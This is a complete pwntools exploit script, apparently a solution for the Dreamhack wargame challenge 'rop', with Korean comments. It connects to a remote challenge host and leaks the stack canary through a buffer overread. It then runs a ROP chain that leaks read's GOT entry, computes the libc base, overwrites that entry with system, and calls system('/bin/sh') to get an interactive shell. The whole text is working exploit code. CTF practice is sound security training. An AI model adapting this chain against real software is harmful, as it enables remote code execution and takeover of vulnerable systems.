from pwn import *

def slog(name, addr) : return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 14246)
e = ELF('./rop')
libc = ELF('./libc.so.6')

pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400854

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8

# 우리는 system의 got을 모르기 때문에 일단 read_got을 읽어서 이를 이용하자
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...) -> read_got을 system으로 바꾸고 싶어...
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh")->system("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2) # write(1, read_got, ...)에서 받아옴
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']

slog('read', read)
slog('system', system)
slog('libc base', libc_base)
p.sendline(p64(system) + b'/bin/sh\x00')

p.interactive()